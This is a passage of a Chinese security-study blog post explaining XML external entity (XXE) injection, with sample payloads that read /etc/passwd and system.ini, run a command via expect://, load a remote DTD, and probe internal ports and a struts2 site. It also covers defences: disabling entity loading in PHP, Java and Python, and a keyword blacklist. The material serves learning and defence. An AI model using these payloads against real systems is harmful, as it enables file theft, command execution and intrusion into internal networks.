+<h2 id="0x05-XXE"><a href="#0x05-XXE" class="headerlink" title="0x05 XXE"></a>0x05 XXE</h2><h3 id="1-XXE介绍"><a href="#1-XXE介绍" class="headerlink" title="1. XXE介绍"></a>1. XXE介绍</h3><p>XXE，英文全称为XML External Entity Injection，翻译成中文为XML外部实体注入。通过字面意思就可以知道这是通过外部实体进行注入的，那么要知道外部实体是什么就必须先看一下XML结构示意图。</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112220216997.png" alt="image-20210112220216997"></p>
+<p>首先是XML声明这是固定不变的，然后是文档类型定义，不同的文档类型有不同的文档元素。例如上文中的DTD定义文档的根元素是note，则下面note文档元素应该如定义的写法一样。当允许应用外部实体时就可以构造恶意内容进行攻击。</p>
+<h3 id="2-引入外部实体"><a href="#2-引入外部实体" class="headerlink" title="2. 引入外部实体"></a>2. 引入外部实体</h3><ul>
+<li><p>方式一</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;! ENTITY b SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;   <span class="comment">//这里的a,b自定义</span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt; <span class="comment">//引用b里面的内容，也就是双引号内的内容</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方式二</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">	&lt;! ENTITY % d SYSTEM <span class="string">"http://demo.com/xxe.dtd"</span></span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">    </span><br><span class="line">xxe.dtd中的内容为：&lt;! ENTITY b SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方式三</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE a SYSTEM <span class="string">"http://demo.com/xxe.dtd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">    </span><br><span class="line">xxe.dtd中的内容为：&lt;! ENTITY b SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="3-常用攻击payload"><a href="#3-常用攻击payload" class="headerlink" title="3. 常用攻击payload"></a>3. 常用攻击payload</h3><ul>
+<li><p>读取任意文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt; <span class="comment">//这里的ANY定义了文档元素可以为任意元素</span></span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///c:/windows/system.ini"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行系统命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE ANY[   <span class="comment">//这里的ANY定义了文档元素可以为任意元素</span></span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"expect://id"</span>&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>探测内网端口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE ANY[   <span class="comment">//这里的ANY定义了文档元素可以为任意元素</span></span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://demo.com:3306/image"</span>&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line">    </span><br><span class="line">原理类似于ssrf的端口探测，都是基于返回的错误信息进行判断。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>攻击内网网站（struts2）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE ANY[   <span class="comment">//这里的ANY定义了文档元素可以为任意元素</span></span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://demo.com:8080/struts2-blank"</span>&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br><span class="line">    </span><br><span class="line">原理类似于ssrf的攻击内网网站，都是基于内网机器可以对内网机器发起请求引起的。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常用的协议</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112223950560.png" alt="image-20210112223950560"></p>
+</li>
+</ul>
+<h3 id="4-XXE防御手段"><a href="#4-XXE防御手段" class="headerlink" title="4. XXE防御手段"></a>4. XXE防御手段</h3><ol>
+<li><p>禁用外部实体应用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. php</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">2. JAVA</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br><span class="line">3. Python</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>黑名单过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">建立黑名单，如DOCTYPE、ENTITY、SYSTEM、PUBLIC等字符，过滤掉用户输入的敏感词。</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p>SSRF部分：</p>
+<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/91819069" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/91819069</a></li>
+<li><a href="https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5</a></li>
+<li><a href="https://www.freebuf.com/articles/web/20407.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/20407.html</a></li>
+<li><a href="https://www.jianshu.com/p/612c010e588e" target="_blank" rel="noopener">https://www.jianshu.com/p/612c010e588e</a></li>
+<li><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></li>
+</ul>
+<p>XXE部分：</p>
+<ul>
+<li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></li>
+<li><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></li>
+<li><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Bu1
+  </li>
+<li class="post-copyright-link">
+  <strong>本文链接：</strong>
+  <a href="http://bu1.github.io/2021/01/14/第十三周：SSRF漏洞学习实战/" title="第十三周：SSRF漏洞学习实战">http://bu1.github.io/2021/01/14/第十三周：SSRF漏洞学习实战/</a>
+</li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+	<div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------END<i class="fa fa-paw"></i>-------------</div>
+    
+</div>
+      
+    </div>
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/12/第十二周：XSS漏洞学习实战/" rel="next" title="第十二周：XSS漏洞学习实战">
+                <i class="fa fa-chevron-left"></i> 第十二周：XSS漏洞学习实战
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  
+  
+  
+  
+  
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Bu1">
+            
+              <p class="site-author-name" itemprop="name">Bu1</p>
+              <p class="site-description motion-element" itemprop="description">最为惊艳的是思想碰撞产生的火花。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tanpuhan.github.io" title="CoCo1er" target="_blank">CoCo1er</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.y1nhui.com" title="y1nhui" target="_blank">y1nhui</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#任务标题：Web-安全之-SSRF-漏洞学习实战"><span class="nav-number">1.</span> <span class="nav-text">任务标题：Web 安全之 SSRF 漏洞学习实战</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#学习报告"><span class="nav-number">2.</span> <span class="nav-text">学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SSRF漏洞原理"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 SSRF漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SSRF漏洞代码示例"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 SSRF漏洞代码示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SSRF漏洞利用"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 SSRF漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-SSRF漏洞常见挖掘方法"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 SSRF漏洞常见挖掘方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF常见的种类"><span class="nav-number">2.4.1.</span> <span class="nav-text">SSRF常见的种类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF通常可能存在的地方"><span class="nav-number">2.4.2.</span> <span class="nav-text">SSRF通常可能存在的地方</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF漏洞验证方法"><span class="nav-number">2.4.3.</span> <span class="nav-text">SSRF漏洞验证方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF绕过过滤"><span class="nav-number">2.4.4.</span> <span class="nav-text">SSRF绕过过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-SSRF漏洞常用防御方法"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 SSRF漏洞常用防御方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-XXE"><span class="nav-number">2.6.</span> <span class="nav-text">0x05 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-XXE介绍"><span class="nav-number">2.6.1.</span> <span class="nav-text">1. XXE介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-引入外部实体"><span class="nav-number">2.6.2.</span> <span class="nav-text">2. 引入外部实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-常用攻击payload"><span class="nav-number">2.6.3.</span> <span class="nav-text">3. 常用攻击payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-XXE防御手段"><span class="nav-number">2.6.4.</span> <span class="nav-text">4. XXE防御手段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-参考链接"><span class="nav-number">2.7.</span> <span class="nav-text">0x06 参考链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bu1</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">54.3k</span>
+  
+</div>
+
+
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>"
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>-->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/';
+          this.page.identifier = '2021/01/14/第十三周：SSRF漏洞学习实战/';
+          this.page.title = '第十三周：SSRF漏洞学习实战';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
